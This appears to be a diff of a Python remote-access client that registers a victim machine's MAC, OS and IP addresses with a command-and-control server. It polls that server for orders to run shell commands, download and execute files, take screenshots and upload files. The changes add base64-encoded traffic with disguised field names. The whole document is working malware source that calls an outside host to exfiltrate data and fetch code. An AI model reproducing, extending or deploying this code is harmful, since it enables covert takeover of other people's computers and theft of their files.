@@ -20,6 +20,7 @@ import tkinter as tk
 from tkinter import messagebox
 import base64
 import time
+import json
 
 
 """
@@ -44,8 +45,8 @@ my_headers.update({
     })
 s = requests.Session()
 
-home_host = 'http://uw471.mikr.us'
-#home_host = 'http://127.0.0.1:8000'
+#home_host = 'http://uw471.mikr.us'
+home_host = 'http://127.0.0.1:8000'
 
 
 """
@@ -55,19 +56,31 @@ There are basic informations necessary to register PC (or update if PC exists, b
 this will be made by server side).
 
 """
+def send_request(page, data, *args):
+
+    enc_data = base64.b64encode((str(data).replace('\'', '"')).encode('UTF-8')).decode('UTF-8')
+    payload = {
+        'a3Vyd': enc_data
+    }
+    if len(args) == 1:
+        say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers, files=args[0])
+    else:
+        say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers)
+    print(say_hello.text)
+    return say_hello
 
 
 def register_at_db():
 
-    payload = {
+    cli_data = {
         'det_mac': det_mac,
         'det_os': det_os,
         'det_name': det_name,
         'det_int_ip': det_int_ip,
         'det_ext_ip': det_ext_ip,
     }
-    say_hello = s.post(home_host+'/register/', data=payload, headers=my_headers)
-    print(say_hello.text)
+    print(cli_data)
+    send_request('register', cli_data)
 
 
 """
@@ -80,16 +93,15 @@ Really, only for training with encoding.
 
 
 def send_result(result, last_activity, det_mac, uniqueid):
-    encoded_result = (re.search('b\'(.*)\'', str(base64.b64encode(str(result).encode()))).group(1))
-    payload = {
-        'result': ('%s' % (encoded_result)),
-        'last_activity': last_activity,
-        'det_mac': det_mac,
-        'uniqueid': uniqueid
+    #print(result)
+    cli_data = {
+        "func_result": result,
+        "last_activity": last_activity,
+        "det_mac": det_mac,
+        "uniqueid": uniqueid
     }
-    #print(payload)
-    say_result = s.post(home_host+'/result/', data=payload, headers=my_headers)
-    #print(say_result.text)
+    #print(cli_data)
+    send_request('result', cli_data)
 
 
 """
@@ -100,13 +112,11 @@ Ping function, which identify PC as iddle (by server side)
 
 
 def ping(last_activity, det_mac):
-    payload = {
+    cli_data = {
         'last_activity': last_activity,
         'det_mac': det_mac
     }
-    #print(payload)
-    say_pong = s.post(home_host+'/ping/', data=payload, headers=my_headers)
-    #print(say_pong.text)
+    send_request('ping', cli_data)
     confirmation = 'Pong'
     return confirmation
 
@@ -127,11 +137,15 @@ def run_command(command, *args):
         params_list.append(a + ' ')
     s = '\, '
     s.join(params_list)
-    #print(paramlist)
-    result = subprocess.run([command, params_list], stdout=subprocess.PIPE)
-    #print(result)
+    print(params_list)
+    execute = subprocess.run([command, params_list], stdout=subprocess.PIPE)
+    if 'stdout=b\'\'' in str(execute):
+        result = f'''Command {command} executed with no output'''
+    else:
+        result = (re.search('stdout=b(.*)\)', str(execute)).group(1)).replace('\'', '')
+    print(result)
     print('Command executed')
-    return result
+    return str(result)
 
 
 """
@@ -151,11 +165,11 @@ def downloader(url, path, *args):
     print('Download completed.')
     if len(args) > 0 and args[0] == 'y':
         run_command(path + '\\' + savefilename)
-        confirmation = 'Downloaded, executed'
+        confirmation = 'File %s downloaded, executed' % url
         return confirmation
     else:
         print('Not requested to run downloaded file.')
-        confirmation = 'Downloaded, not executed'
+        confirmation = 'File %s downloaded, not executed' % url
         return confirmation
 
 
@@ -167,11 +181,16 @@ Additional window from TK drawer will be hidded.
 """
 
 
-def popup(text, title):
+def popup(text, title, *args):
     r_window = tk.Tk()
     r_window.withdraw()
-    messagebox.showinfo(text, title)
-    confirmation = 'Showed'
+    print(text)
+    print(title)
+    if '%' in text or title:
+        messagebox.showinfo(text.replace('%', ' '), title.replace('%', ' '))
+    else:
+        messagebox.showinfo(text, title)
+    confirmation = 'Messagebox showed'
     return confirmation
 
 
@@ -185,7 +204,7 @@ Name of screenshot is a filtered MAC (without :) and current time.
 """
 
 
-def screenshot():
+def screenshot(*args):
     curr_user = os.getlogin()
     sys_disk = os.getenv("SystemDrive")
     print(sys_disk)
@@ -195,29 +214,27 @@ def screenshot():
     r = s.get(app_url)
     with open(app_dir + 'screenCapture.bat', 'w') as f:
         f.write(r.text)
-    screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + (''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))))
+    screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + det_mac)
     print(screen_name)
     run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
-    payload = {
-        'det_mac': det_mac
-    }
-    file = {
-        'file': open(app_dir + screen_name + '.jpg', 'rb')
-    }
-    u = s.post(home_host + '/upload/', files=file, data=payload)
-    print(u.text)
+    fileupload(app_dir + screen_name + '.jpg')
+    confirmation = 'Screenshot %s.jpg uploaded' % screen_name
+    return confirmation
 
 
-def fileupload(file_path):
-    payload = {
-        'det_mac': det_mac
-    }
-    file = {
-        'file': open(file_path, 'rb')
-    }
-    u = s.post(home_host + '/upload/', files=file, data=payload)
-    print(u.text)
-    confirmation = 'Uploaded'
+def fileupload(file_path, *args):
+    if os.path.isfile(file_path) == True:
+        cli_data = {
+            'det_mac': det_mac
+        }
+        file = {
+            'f1L3': open(file_path, 'rb')
+        }
+        #say_file = s.post(home_host + '/upload/', files=file, data=payload)
+        send_request('upload', cli_data, file)
+        confirmation = 'File %s uploaded' % file_path
+    else:
+        confirmation = 'File %s not exists' % file_path
     return confirmation
 
 
@@ -246,8 +263,9 @@ for i in range (0,100):
     try:
         print('++++ PROBUJE POLACZYC Z CC ++++')
         register_at_db()
-    except:
+    except Exception as e:
         print('++++ NIEPOWODZENIE, SLEEP NA 30 SEKUND ++++')
+        print(e)
         time.sleep(30)
         continue
     break
@@ -261,7 +279,7 @@ If exceptions will be occured - the loop back to beginning.
 """
 
 
-payload = {
+cli_data = {
         'det_mac': det_mac
     }
 
@@ -272,65 +290,42 @@ while True:
         print('Otrzymane id %s' % received_ids)
         print('Wysłane rezultaty o id %s ' % send_commands)
         # List of available commands
-        command_list = {
+        command_dict = {
             'popup': popup,
             'run_command': run_command,
             'downloader': downloader,
             'screenshot': screenshot,
             'upload': fileupload
         }
-        bar = s.post(home_host+'/order/', data=payload)
-        #print(bar.text)
-        # Get ID from fetched url
-        received_id = bar.text[0:6]
-        print(received_id)
-        #print(received_ids)
+        say_ready = send_request('order', cli_data)
+        resp_data = say_ready.json()
+        resp_dict = json.loads(base64.b64decode(resp_data['65hFDs']).decode('utf-8'))
+        print(resp_dict)
         time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
-        # The pong is necessary, if ID was executed earlier, or MAC adress is not on fetched data
+        # The pong is necessary, if ID was executed earlier
         pong = time_curr
-        # If command from list of commands is in fetched data, and mac adress is also on fetched data do this:
-        if any(command in bar.text for command in command_list) and det_mac in bar.text:
+        # If command from list of commands is in fetched data
+        if any(command in resp_dict['function'] for command in command_dict):
             # Check that command was not already executed
-            if received_id not in received_ids:
+            if resp_dict['uniqueid'] not in received_ids:
                 # Search for command in fetched data
-                received_command = (re.search('#(.*)\(', str(bar.text)).group(1))
-                print('++++ ZNALEZIONO POLECENIE: %s ++++' % received_command)
-                # If command have some additional args
-                if '$' in bar.text:
-
-                    """
-                    
-                    If in fetched data is $ (this char is used in remote CC as new param char) - delete this char
-                    Also, in parm is some path for example C:\Windows - replace dual \\ (python automatically add them)
-                    to a single slash.
-                    
-                    """
-
-                    args_string = (re.search('\(\$(.*)\)\',', str(bar.text))
-                                   .group(1)).replace('$', '').replace('\\\\', '\\')
-                    # Split all params in one list
-                    args_list = args_string.split(',')
-                    print('++++ DODATKOWE ARGUMENTY: %s ++++' % args_list)
-                    command_to_run = command_list[received_command]
-                    result_from_run = command_to_run(*args_list)
-                else:
-                    # If there is no arguments in received command, execute only command
-                    command_to_run = command_list[received_command]
-                    result_from_run = command_to_run()
-                # Add to list received ID to further actions
-                received_ids.append(received_id)
+                print('++++ ZNALEZIONO FUNKCJE: %s ++++' % resp_dict['function'])
+                print('++++ DODATKOWE ARGUMENTY: %s ++++' % resp_dict['params'])
+                command_to_run = command_dict[resp_dict['function']]
+                result_from_run = command_to_run(*resp_dict['params'])
+                received_ids.append(resp_dict['uniqueid'])
                 # Check, that executed in a few moments command was already send or not
-                if received_id not in send_commands:
+                if resp_dict['uniqueid'] not in send_commands:
                     print('++++ WYSYLAM REZULTAT WYKONANEGO POLECENIA %s O uniqueid %s ++++' %
-                          (received_command, received_id))
-                    send_result(result_from_run, time_curr, det_mac, received_id)
-                    send_commands.append(received_id)
+                          (resp_dict['function'], resp_dict['uniqueid']))
+                    send_result(result_from_run, time_curr, det_mac, resp_dict['uniqueid'])
+                    send_commands.append(resp_dict['uniqueid'])
                 else:
                     print('++++ ODPOWIEDŹ NA POLECENIE %s O uniqueid %s JUŻ WYSLANA ++++' %
-                          (received_command, received_id))
+                          (resp_dict['function'], resp_dict['uniqueid']))
             else:
                 # If command was already executed - make a pong (inform CC that client is in iddle state)
-                print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % received_id)
+                print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % resp_dict['uniqueid'])
                 print('++++ NIC NIE WYKONALEM, WYSYLAM PONG ++++')
                 #print(pong)
                 ping(pong, det_mac)
